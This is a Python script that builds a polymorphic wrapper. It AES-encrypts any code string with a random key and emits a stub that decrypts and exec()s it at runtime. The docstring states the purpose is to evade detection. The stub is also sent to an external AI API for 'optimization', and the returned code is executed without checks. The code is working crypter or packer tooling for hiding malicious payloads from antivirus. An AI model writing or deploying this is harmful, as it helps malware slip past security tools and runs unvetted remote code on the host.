import os
import hashlib
import random
import string
from Crypto.Cipher import AES
from base64 import b64encode, b64decode
from api_interaction import send_api_request, receive_api_response

def generate_random_string(length=10):
    """Generate a random string of fixed length."""
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def encrypt_code(code, key):
    """Encrypt the code snippet using AES encryption."""
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(code.encode('utf-8'))
    return b64encode(nonce + tag + ciphertext).decode('utf-8')

def decrypt_code(encrypted_code, key):
    """Decrypt the code snippet using AES encryption."""
    decoded_data = b64decode(encrypted_code)
    nonce = decoded_data[:16]
    tag = decoded_data[16:32]
    ciphertext = decoded_data[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext.decode('utf-8')

def generate_polymorphic_code(api_key, original_code):
    """Generate polymorphic code that adapts during each execution to evade detection."""
    # Generate a random string to use as a key for encryption
    random_key = generate_random_string(16)
    
    # Encrypt the original code
    encrypted_code = encrypt_code(original_code, random_key.encode('utf-8'))
    
    # Generate a new code snippet that decrypts and executes the encrypted code
    polymorphic_code = f"""
import os
from base64 import b64decode
from Crypto.Cipher import AES

def decrypt_and_execute(encrypted_code):
    key = '{random_key}'.encode('utf-8')
    decoded_data = b64decode(encrypted_code)
    nonce = decoded_data[:16]
    tag = decoded_data[16:32]
    ciphertext = decoded_data[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    decrypted_code = cipher.decrypt_and_verify(ciphertext, tag)
    exec(decrypted_code.decode('utf-8'))

encrypted_code = '{encrypted_code}'
decrypt_and_execute(encrypted_code)
"""
    
    # Send the polymorphic code to the AI API for further optimization
    response = send_api_request(api_key, polymorphic_code)
    optimized_code = receive_api_response(response)
    
    return optimized_code

# Example usage
api_key = 'your_api_key_here'
original_code = 'print("Hello, World!")'
polymorphic_code = generate_polymorphic_code(api_key, original_code)
exec(polymorphic_code)